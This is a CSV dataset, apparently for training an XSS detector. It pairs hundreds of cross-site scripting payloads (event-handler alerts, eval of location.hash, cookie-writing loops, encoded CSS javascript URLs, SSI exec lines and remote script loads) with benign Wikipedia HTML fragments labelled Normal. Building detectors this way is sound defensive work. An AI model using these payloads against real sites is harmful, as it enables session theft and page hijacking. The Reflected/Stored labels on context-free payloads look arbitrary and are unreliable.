Sentence,Final_Label
"<data onclick=""alert(1)"">test</data>",Reflected XSS
"	 </span> <span class=""reference-text"">",Normal
"<script>var data = document.referrer; document.getElementById(""demo"").innerHTML=data;</script>",DOM-based XSS
"<div role=""note"" class=""hatnote navigation-not-searchable"">Further information: <a href=""/wiki/Algorithmic_bias"" title=""Algorithmic bias"">Algorithmic bias </a> </div>",Normal
"	 </span> <span class=""reference-text""><cite class=""citation web""><a rel=""nofollow"" class=""external text"" href=""http://fusion.net/story/54583/the-case-against-killer-robots-from-a-guy-actually-building-ai/"">""The case against killer robots, from a guy actually working on artificial intelligence"" </a>. <i>Fusion.net </i>. <a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20160204175716/http://fusion.net/story/54583/the-case-against-killer-robots-from-a-guy-actually-building-ai/"">Archived </a> from the original on 4 February 2016<span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">31 January ",Normal
"	 </span> <span class=""reference-text"">",Normal
<object onpointerdown=alert(1)>XSS</object>,Stored XSS
"<colgroup onmousedown=""alert(1)"">test</colgroup>",Reflected XSS
	 </span> </a>,Normal
"<pre onmouseenter=""alert(1)"">test</pre>",Reflected XSS
<script>eval(document.location.hash.substring(1));</script>,DOM-based XSS
"<svg onmousemove=""alert(1)"">test</svg>",Stored XSS
<script>var x = document.URL; document.write(x);</script>,DOM-based XSS
"<script>setTimeout(function(){ document.write(location.hash); }, 1000);</script>",DOM-based XSS
"<svg onmouseleave=""alert(1)"">test</svg>",Stored XSS
<script>eval(document.location.hash.substring(1));</script>,DOM-based XSS
"	 </span> <span class=""reference-text""><cite class=""citation news"">Brown, Noam; Sandholm, Tuomas (26 January 2018). <a rel=""nofollow"" class=""external text"" href=""http://science.sciencemag.org/content/359/6374/418"">""Superhuman AI for heads-up no-limit poker: Libratus beats top professionals"" </a>. <i>Science </i>. pp.&#160;418–424. <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1126%2Fscience.aao1733"">10.1126/science.aao1733 </a><span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">7 May ",Normal
"<script>setTimeout(function(){ document.write(location.hash); }, 1000);</script>",DOM-based XSS
	 </span> </a> </li>,Normal
<script>var hash = location.hash; eval(hash.substring(1));</script>,DOM-based XSS
<script>var x = document.URL; document.write(x);</script>,DOM-based XSS
"<script>setTimeout(function(){ document.write(location.hash); }, 1000);</script>",DOM-based XSS
"<script oncut=""alert(1)"" contenteditable>test</script>",Stored XSS
"<embed onbeforepaste=""alert(1)"" contenteditable>test</embed>",Stored XSS
"<script>var url = document.URL; document.getElementById(""test"").innerHTML=url;</script>",DOM-based XSS
"<li id=""cite_note-First_AI_winter-11""><span class=""mw-cite-backlink"">^ <a href=""#cite_ref-First_AI_winter_11-0""><sup><i><b>a </b> </i> </sup> </a> <a href=""#cite_ref-First_AI_winter_11-1""><sup><i><b>b </b> </i> </sup> </a> ",Normal
"<legend draggable=""true"" ondragenter=""alert(1)"">test</legend>",Reflected XSS
<embed onpointerenter=alert(1)>XSS</embed>,Stored XSS
"<object oncut=""alert(1)"" contenteditable>test</object>",Stored XSS
"<object data=""javascript:alert()"">",Stored XSS
"<style>@keyframes slidein {}</style><details style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></details>",Reflected XSS
	 </span> </li>,Normal
<script id=x tabindex=1 onbeforedeactivate=alert(1)></script><input autofocus>,Stored XSS
<svg><a onload=alert(1)></a>,Stored XSS
"<li><a href=""/wiki/Bill_Joy"" title=""Bill Joy"">Bill Joy </a> </li>",Normal
	 </span>,Normal
"<frameset draggable=""true"" ondragstart=""alert(1)"">test</frameset>",Reflected XSS
<svg><a onload=alert(1)></a>,Stored XSS
"<iframe onmouseover=""alert(1)"">test</iframe>",Stored XSS
"<dl draggable=""true"" ondragstart=""alert(1)"">test</dl>",Reflected XSS
"<li><a href=""/wiki/Bacterial_Colony_Optimization"" class=""mw-redirect"" title=""Bacterial Colony Optimization"">Bacterial Colony Optimization </a> </li> </ul>",Normal
	 </span> ,Normal
"<li><a href=""/wiki/Cybernetics_in_the_Soviet_Union"" title=""Cybernetics in the Soviet Union"">Cybernetics in the Soviet Union </a> </li>",Normal
"<script>var data = document.referrer; document.getElementById(""demo"").innerHTML=data;</script>",DOM-based XSS
<p onpointerout=alert(1)>XSS</p>,Reflected XSS
<svg><span onload=alert(1)></span>,Stored XSS
	 </span> </a> </li>,Normal
"<DIV STYLE=""background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029"">",Stored XSS
"<style>@keyframes x{}</style><audio style=""animation-name:x"" onanimationend=""alert(1)""></audio>",Reflected XSS
"<script onclick=""alert(1)"">test</script>",Stored XSS
<svg onpointerout=alert(1)>XSS</svg>,Stored XSS
"<script>setInterval(function(){document.write(document.cookie);},2000);</script>",DOM-based XSS
"<samp draggable=""true"" ondragenter=""alert(1)"">test</samp>",Reflected XSS
"<nextid onkeypress=""alert(1)"" contenteditable>test</nextid>",Reflected XSS
<script>window.onload=function(){document.body.innerHTML=location.search;}</script>,DOM-based XSS
<script>var input = window.location.search; document.body.innerHTML = input;</script>,DOM-based XSS
"<table onmouseenter=""alert(1)"">test</table>",Reflected XSS
<svg><small onload=alert(1)></small>,Stored XSS
"<script>setInterval(function(){document.write(document.cookie);},2000);</script>",DOM-based XSS
"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Science&amp;rft.atitle=Artificial+intelligence+faces+reproducibility+crisis&amp;rft.pages=725-726&amp;rft.date=2018-02-16&amp;rft_id=info%3Adoi%2F10.1126%2Fscience.359.6377.725&amp;rft_id=info%3Abibcode%2F2018Sci...359..725H&amp;rft.aulast=Hutson&amp;rft.aufirst=Matthew&amp;rft_id=http%3A%2F%2Fscience.sciencemag.org%2Fcontent%2F359%2F6377%2F725&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",Normal
"<style>:target {transform: rotate(180deg);}</style><embed id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></embed>",Stored XSS
<dfn onblur=alert(1) tabindex=1 id=x></dfn><input autofocus>,Reflected XSS
"</TITLE><SCRIPT>alert("""");</SCRIPT>",Stored XSS
<image onpointermove=alert(1)>XSS</image>,Reflected XSS
<svg><dialog onload=alert(1)></dialog>,Stored XSS
"<script>setTimeout(function(){ document.write(location.hash); }, 1000);</script>",DOM-based XSS
<script>var hash = location.hash; eval(hash.substring(1));</script>,DOM-based XSS
"<script>setInterval(function(){document.write(document.cookie);},2000);</script>",DOM-based XSS
"<SCRIPT DEFER>alert("""")</SCRIPT>",Stored XSS
"<li id=""cite_note-Dreyfus&#39;_critique-355""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Dreyfus&#39;_critique_355-0"">^ </a> </b> ",Normal
	 </span>,Normal
"<embed onmouseup=""alert(1)"">test</embed>",Stored XSS
"<li><a href=""/wiki/Genetic_programming"" title=""Genetic programming"">Genetic programming </a> </li>",Normal
"<style oncopy=""alert(1)"" contenteditable>test</style>",Reflected XSS
<script id=x tabindex=1 onfocus=alert(1)></script>,Stored XSS
"<dt><a class=""reference internal"" href=""topics/developer-tools.html""><span class=""doc"">Using your browser’s Developer Tools for scraping",Normal
<script>window.onload=function(){document.body.innerHTML=location.search;}</script>,DOM-based XSS
"<del onbeforepaste=""alert(1)"" contenteditable>test</del>",Reflected XSS
"<thead onpaste=""alert(1)"" contenteditable>test</thead>",Reflected XSS
"<frameset onmouseout=""alert(1)"">test</frameset>",Reflected XSS
<svg><s onload=alert(1)></s>,Stored XSS
"""><iframe src=""javascript:alert()"">",Stored XSS
<svg><i onload=alert(1)></i>,Stored XSS
"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=The+New+York+Times&amp;rft.atitle=The+Promise+of+Artificial+Intelligence+Unfolds+in+Small+Steps&amp;rft.date=2016-02-28&amp;rft.aulast=Lohr&amp;rft.aufirst=Steve&amp;rft_id=https%3A%2F%2Fwww.nytimes.com%2F2016%2F02%2F29%2Ftechnology%2Fthe-promise-of-artificial-intelligence-unfolds-in-small-steps.html&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",Normal
<script>window.onload=function(){document.body.innerHTML=location.search;}</script>,DOM-based XSS
 ,Normal
<script>var input = window.location.search; document.body.innerHTML = input;</script>,DOM-based XSS
"<embed onclick=""alert(1)"">test</embed>",Stored XSS
"<script>setInterval(function(){document.write(document.cookie);},2000);</script>",DOM-based XSS
 </li>,Normal
	 </span> ,Normal
"<footer ondblclick=""alert(1)"">test</footer>",Reflected XSS
<svg><hgroup onload=alert(1)></hgroup>,Stored XSS
"<s onbeforepaste=""alert(1)"" contenteditable>test</s>",Reflected XSS
<hgroup id=x tabindex=1 ondeactivate=alert(1)></hgroup><input id=y autofocus>,Reflected XSS
"<kbd onmousemove=""alert(1)"">test</kbd>",Reflected XSS
"<script>document.getElementById(""output"").innerHTML = location.hash.substring(1);</script>",DOM-based XSS
<object onpointerleave=alert(1)>XSS</object>,Stored XSS
<track onpointerover=alert(1)>XSS</track>,Reflected XSS
"a=alert,a(1)",Stored XSS
"<script draggable=""true"" ondragenter=""alert(1)"">test</script>",Stored XSS
<script>var input = window.location.search; document.body.innerHTML = input;</script>,DOM-based XSS
"<kbd onbeforecopy=""alert(1)"" contenteditable>test</kbd>",Reflected XSS
"<ul><li><a href=""/wiki/Database"" title=""Database"">Database management system </a> </li>",Normal
"<embed oncut=""alert(1)"" contenteditable>test</embed>",Stored XSS
<dir id=x tabindex=1 onfocus=alert(1)></dir>,Reflected XSS
"<SCRIPT ""a='>'"" SRC=""httx://.rocks/.js""></SCRIPT>",Stored XSS
"<nav onmouseleave=""alert(1)"">test</nav>",Reflected XSS
"<object data=""javascript:alert()"">",Stored XSS
<meta onpointerdown=alert(1)>XSS</meta>,Reflected XSS
"<script>setInterval(function(){document.write(document.cookie);},2000);</script>",DOM-based XSS
"<track oncut=""alert(1)"" contenteditable>test</track>",Reflected XSS
<script>eval(document.location.hash.substring(1));</script>,DOM-based XSS
"<li id=""cite_note-100""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-100"">^ </a> </b> ",Normal
<script>eval(document.location.hash.substring(1));</script>,DOM-based XSS
"<iframe draggable=""true"" ondragleave=""alert(1)"">test</iframe>",Stored XSS
"<script>setInterval(function(){document.write(document.cookie);},2000);</script>",DOM-based XSS
"	 </span><span style=""display: inline-block; margin-left: 4px; width: 182px; vertical-align: middle;""><a href=""https://www.wikidata.org/wiki/Q11660"" class=""extiw"" title=""d:Q11660"">Data </a> from Wikidata ",Normal
<script>var hash = location.hash; eval(hash.substring(1));</script>,DOM-based XSS
"	 </span> <span class=""toctext"">Logic-based ",Normal
" </tr><tr><th style=""padding:0.1em"">",Normal
"<li><a href=""#CITEREFNilsson1998"">Nilsson 1998 </a>, chpt. 3.3, 10.3, 17.5, 20 </li> </ul>",Normal
<object onpointermove=alert(1)>XSS</object>,Stored XSS
<script>window.onload=function(){document.body.innerHTML=location.search;}</script>,DOM-based XSS
<script>var input = window.location.search; document.body.innerHTML = input;</script>,DOM-based XSS
<script>var hash = location.hash; eval(hash.substring(1));</script>,DOM-based XSS
<svg><var onload=alert(1)></var>,Stored XSS
"<li id=""cite_note-115""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-115"">^ </a> </b> ",Normal
<embed id=x onfocus=alert(1) type=text/html>,Stored XSS
"<dialog onmouseout=""alert(1)"">test</dialog>",Reflected XSS
"<li id=""cite_note-394""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-394"">^ </a> </b> ",Normal
"<script>var data = document.referrer; document.getElementById(""demo"").innerHTML=data;</script>",DOM-based XSS
"<a draggable=""true"" ondrag=""alert(1)"">test</a>",Reflected XSS
<script>var hash = location.hash; eval(hash.substring(1));</script>,DOM-based XSS
"<script>setInterval(function(){document.write(document.cookie);},2000);</script>",DOM-based XSS
"tYPE=""text/x-scriptlet"" DATA=""http://.rocks/scriptlet.html",Stored XSS
"<iframe draggable=""true"" ondragstart=""alert(1)"">test</iframe>",Stored XSS
"<sub onmouseout=""alert(1)"">test</sub>",Reflected XSS
"<dialog onmousemove=""alert(1)"">test</dialog>",Reflected XSS
<blink onpointerup=alert(1)>XSS</blink>,Reflected XSS
"<dl oncut=""alert(1)"" contenteditable>test</dl>",Reflected XSS
"<embed onmousemove=""alert(1)"">test</embed>",Stored XSS
<script>window.onload=function(){document.body.innerHTML=location.search;}</script>,DOM-based XSS
<svg><sup onload=alert(1)></sup>,Stored XSS
"<script>var url = document.URL; document.getElementById(""test"").innerHTML=url;</script>",DOM-based XSS
	 </span>,Normal
"<script>setTimeout(function(){ document.write(location.hash); }, 1000);</script>",DOM-based XSS
"<script>var url = document.URL; document.getElementById(""test"").innerHTML=url;</script>",DOM-based XSS
"<body class=""wy-body-for-nav"">",Normal
<strong onpointerout=alert(1)>XSS</strong>,Reflected XSS
"<embed onmousemove=""alert(1)"">test</embed>",Stored XSS
"<b draggable=""true"" ondragstart=""alert(1)"">test</b>",Reflected XSS
<script>var hash = location.hash; eval(hash.substring(1));</script>,DOM-based XSS
"<script onmouseleave=""alert(1)"">test</script>",Stored XSS
<script>var x = document.URL; document.write(x);</script>,DOM-based XSS
<svg><p onload=alert(1)></p>,Stored XSS
"<li id=""cite_note-385""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-385"">^ </a> </b> ",Normal
"<li><a href=""/wiki/Data_mining"" title=""Data mining"">Data mining </a> </li>",Normal
<svg><abbr onload=alert(1)></abbr>,Stored XSS
<svg><caption onload=alert(1)></caption>,Stored XSS
"<!--#exec cmd=""/bin/echo '<SCR'""--><!--#exec cmd=""/bin/echo 'IPT SRC=http://.rocks/.js></SCRIPT>'""",Stored XSS
<embed onblur=alert(1) tabindex=1 id=x></embed><input autofocus>,Stored XSS
<svg><nextid onload=alert(1)></nextid>,Stored XSS
	 </span> </li>,Normal
"<script>var url = document.URL; document.getElementById(""test"").innerHTML=url;</script>",DOM-based XSS
"<li><cite id=""CITEREFBuchanan2005"" class=""citation journal"">Buchanan, Bruce G. (2005). <a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20070926023314/http://www.aaai.org/AITopics/assets/PDF/AIMag26-04-016.pdf"">""A (Very) Brief History of Artificial Intelligence"" </a> <span class=""cs1-format"">(PDF) ",Normal
	<ul >,Normal
"<li id=""cite_note-FOOTNOTEDomingos201588-218""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-FOOTNOTEDomingos201588_218-0"">^ </a> </b> ",Normal
<svg><bdi onload=alert(1)></bdi>,Stored XSS
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> </li>",Normal
<script>var x = document.URL; document.write(x);</script>,DOM-based XSS
  </div>,Normal
"            <a href=""//readthedocs.org/projects/scrapy/?fromdocs=scrapy"">Project Home</a>",Normal
"<script>var data = document.referrer; document.getElementById(""demo"").innerHTML=data;</script>",DOM-based XSS
<multicol id=x tabindex=1 onbeforedeactivate=alert(1)></multicol><input autofocus>,Reflected XSS
"<script onkeydown=""alert(1)"" contenteditable>test</script>",Stored XSS
"<li><a href=""/wiki/Multithreading_(computer_architecture)"" title=""Multithreading (computer architecture)"">Multithreading </a> </li>",Normal
<svg><xmp onload=alert(1)></xmp>,Stored XSS
"<IMG """"""><SCRIPT>alert("""")</SCRIPT>""\>",Stored XSS
"<dt><a class=""reference internal"" href=""topics/dynamic-content.html""><span class=""doc"">Selecting dynamically-loaded content",Normal
